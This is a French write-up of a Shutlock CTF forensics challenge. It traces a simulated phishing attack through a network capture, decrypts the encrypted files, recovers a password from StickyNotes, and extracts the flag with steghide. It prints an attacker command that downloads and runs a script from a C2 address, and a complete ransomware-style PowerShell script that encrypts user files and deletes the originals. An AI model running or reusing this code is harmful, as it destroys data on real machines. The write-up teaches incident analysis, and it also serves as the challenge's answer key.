## Description

### Enquête sur le phishing des JO : Retracer l'attaque Partie 2

Bravo !

Vous voici dans la deuxième partie de votre enquête. 
Le dump réseau vous a été confié avec une partie de son système de fichiers.

L'utilisatrice à qui appartiennent ces informations, est une scientifique qui travaille sur le chiffrement du système d'information des JO.

Ayant la nécessiter de retrouver rapidement ses recherches, on vous demande de l'aider à déchiffrer son système de fichiers.


#### SHA256 

Capture.pcapng : 6D1F223BCC377E1722F8DAE0FB9F2EE397878B87ACA53814D4628562CBF1B933

FileSystem.zip : EDE0509D4779093EEBDA4B2483B943721F7B1F54801BFEFFF11E39B719D224BE

## Objectifs de la création de ce challenge

Ce challenge a été créé pour la première édition du CTF Shutlock.

Il a pour objectifs :
- Analyse de dump réseau
- Base de l'algorithme de Rijndael
- Concepte de password looting
- Base de stéganographie

## Solve

### TL;DR

- Trouver le script Encrypt.ps1 dans le dump réseau
- Comprendre que c'est l'algorithme de Rijndael qui est utilisé et déchiffré le système de fichiers
- Password looting sur le FS afin de trouver le mot de passe de `importante_recherche.zip` dans les StickyNotes
- Retrouver le fichier caché `flag.txt` dans l'image chiffrement.jpeg

### Informations trouvées grâce à l'énoncé

- On sait que c'est une scientifique qui travaille sur le chiffrement du système d'information des JO

Fichiers donnés : 

- `Capture.pcapng` : dump réseau
- `FS.zip` : Partie du File System de l'utilisatrice.

## Solution

### Analyse du dump réseaux

- Utilisation de l'outil [Wireshark](https://www.wireshark.org/)

Grâce à la partie précédente, on a le C2 (Command and Control) du groupe **THE HARMOR** : 172.21.195.17

````powershell
IGotYourFileInfo - [Invoke-WebRequest :: -Uri http://172.21.195.17:5000/Holmes/GetFileInfo.ps1 -OutFile GetFilesInfo.ps1 ; Start-Process -FilePath GetFilesInfo.ps1] (Author)
````

On filtre sur le C2 de l'attaquant ainsi que sur le protocole http 
 `ip.addr == 172.21.195.17 and http` sur wireshark

On récupère ainsi les scripts malveillants.
Le script qui nous intéresse est `Encrypt.ps1`

172.21.195.17	HTTP	GET /Holmes/Encrypt.ps1 HTTP/1.1 

**Contenu du script Encrypt.ps1 :**

```powershell
# Define the directories to search for files
$IP_addr = '172.21.195.17:5000'
$directories = @("$env:USERPROFILE")

# Define the file extensions to encrypt
$extensions = @(".png", ".doc", ".txt", ".zip")
$keyUrl = "http://$IP_addr/Holmes/key.txt"

# Download the key from the URL
$keyContent64 = Invoke-WebRequest -Uri $keyUrl | Select-Object -ExpandProperty Content
$keyContent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($keyContent64))

# Use SHA-256 hash function to produce a 32-byte key
$sha256 = [System.Security.Cryptography.SHA256]::Create()
$key = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($keyContent))
$iv = [System.Security.Cryptography.RijndaelManaged]::Create().IV

# Sauvegarder l'IV dans un fichier
$ivFilePath = "$env:USERPROFILE\Documents\iv"
[System.IO.File]::WriteAllBytes($ivFilePath, $iv)

# Create a new RijndaelManaged object with the specified key
$rijndael = New-Object System.Security.Cryptography.RijndaelManaged
$rijndael.Key = $key
$rijndael.IV = $iv
$rijndael.Mode = [System.Security.Cryptography.CipherMode]::CBC
$rijndael.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7


# Go through each directory
foreach ($dir in $directories) {
    # Go through each file
    Get-ChildItem -Path $dir -Recurse | ForEach-Object {
        # Check the file extension
        if ($extensions -contains $_.Extension) {
            # Generate the new file name
            $newName = $_.FullName -replace $_.Extension, ".shutlock"

            # Read the file contents in bytes
            $contentBytes = [System.IO.File]::ReadAllBytes($_.FullName)

            # Create a new encryptor
            $encryptor = $rijndael.CreateEncryptor()

            # Encrypt the content
            $encryptedBytes = $encryptor.TransformFinalBlock($contentBytes, 0, $contentBytes.Length)

            # Write the encrypted content to a file
            [System.IO.File]::WriteAllBytes($newName, $encryptedBytes)

            # Delete the original file
            Remove-Item $_.FullName
        }
    }
}
```

Les informations clés du script : 

- Algorithme de Rijndael (AES)
- La clef `key.txt` est récupérable dans le dump réseau
- L'IV est présent dans le système de fichiers de l'utilisateur depuis `$env:USERPROFILE\Documents\iv`

### Déchiffrement du système de fichiers 

D'après l'énoncé, l'ordinateur appartient à une scientifique faisant des recherches sur le chiffrement du système d'information des JO.
Le fichier importante_recherche.shutlock nous paraît ainsi intéressant.

#### Première méthode : Utilisation de OpenSSL

````bash
└─$ base64 -d key.txt | sha256sum
72d4cfb3b29136d8ac4fd1eb11c8de7e1a6f482b3600c699b677a4e1e5a3b294  -
└─$ hexdump -C iv
00000000  a6 2c 18 0d 65 f6 78 23  c9 24 a7 b7 7c 31 a3 cb  |.,..e.x#.$..|1..|
00000010
└─$ openssl aes-256-cbc -p -d -nosalt -nopad -K 72d4cfb3b29136d8ac4fd1eb11c8de7e1a6f482b3600c699b677a4e1e5a3b294 -iv a62c180d65f67823c924a7b77c31a3cb -in FileSystem/Documents/Recherche/importante_recherche.shutlock -out importante_recherche.zip
````

#### Deuxième methods : Script

On donne ici un exemple en utilisant powershell

```powershell
$keyContent = "w5www63Dn8OJdGbDqlfDjsK8wqDDomg2w4I7TiBxSyfFk+KAoCZqaMOkIMKQw7tc"
$keyContent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($keyContent))


# Utilisation de SHA-256 pour générer une clé de 32 octets
$sha256 = [System.Security.Cryptography.SHA256]::Create()
$key = $sha256.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($keyContent))

$ivFilePath = @("\Documents\iv")

# Lire l'IV à partir du fichier
$iv = [System.IO.File]::ReadAllBytes($ivFilePath)

# Vérifier si l'IV est bien de 16 octets (128 bits pour AES)
if ($iv.Length -ne 16) {
    Write-Host "L'IV doit être de 16 octets (128 bits)."
    exit
}

# Créer un objet RijndaelManaged avec la clé et l'IV spécifiés
$rijndael = New-Object System.Security.Cryptography.RijndaelManaged
$rijndael.Key = $key
$rijndael.IV = $iv
$rijndael.Mode = [System.Security.Cryptography.CipherMode]::CBC
$rijndael.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

# Définir les répertoires et extensions de fichiers chiffrés
$directories = @("\Downloads\Documents")
$extensions = @(".shutlock")

# Parcourir chaque répertoire
foreach ($dir in $directories) {
    # Parcourir chaque fichier
    Get-ChildItem -Path $dir -Recurse | ForEach-Object {
        # Vérifier l'extension du fichier
        if ($extensions -contains $_.Extension) {
            # Générer le nom de fichier original
            $originalName = $_.FullName -replace ".shutlock", ".file"

            # Lire le contenu chiffré du fichier
            $encryptedBytes = [System.IO.File]::ReadAllBytes($_.FullName)

            # Créer un nouvel decryptor
            $decryptor = $rijndael.CreateDecryptor()

            # Déchiffrer le contenu
            $decryptedBytes = $decryptor.TransformFinalBlock($encryptedBytes, 0, $encryptedBytes.Length)

            # Convertir les bytes déchiffrés en texte
            $decryptedContent = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)

            # Écrire le contenu déchiffré dans le fichier original
            Set-Content -Path $originalName -Value $decryptedContent

            # Optionnel : supprimer le fichier chiffré
            Remove-Item $_.FullName
        }
    }
}
```

#### Note

Pour vérifier le bon déchiffrement, on peut se référer à l'image duck.shutlock

Les autres fichiers hors du dossier `download` ont été généré aléatoirement.

### Password Looting

Plusieurs méthodes / artéfacts sont possibles / présents notamment : 
- Password Looting https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#sticky-notes-passwords
- `Ordi.png` : on remarque l'application StikyNotes ouvertes.
- `FileSystem\AppData\Roaming\Microsoft\Windows\Recent` : db StickyNotes présente

On récupère la data base : `AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe` 
Un parseur existe : https://github.com/dingtoffee/StickyParser
On récupère ainsi le mot de passe : `s3cr3t_r3ch3rch3_pwd_!`


La scientifique ne voulant pas laisser ses recherches sans protection à rajouter un mot de passe.
Malheureusement, n'ayant sûrement pas connaissance des gestionnaires de mot de passe, elle utilise l'application SkickyNotes pour stocker son mot de passe.


### Stéganographie sur le jpeg

````shell
└─$ steghide info chiffrement.jpeg
"chiffrement.jpeg":
  format: jpeg
  capacity: 41.3 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file "flag.txt":
    size: 26.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
└─$ steghide extract -sf chiffrement.jpeg
Enter passphrase:
wrote extracted data to "flag.txt".
└─$ cat flag.txt
SHLK{4uri3z-v0us_cl1qu3r}
````
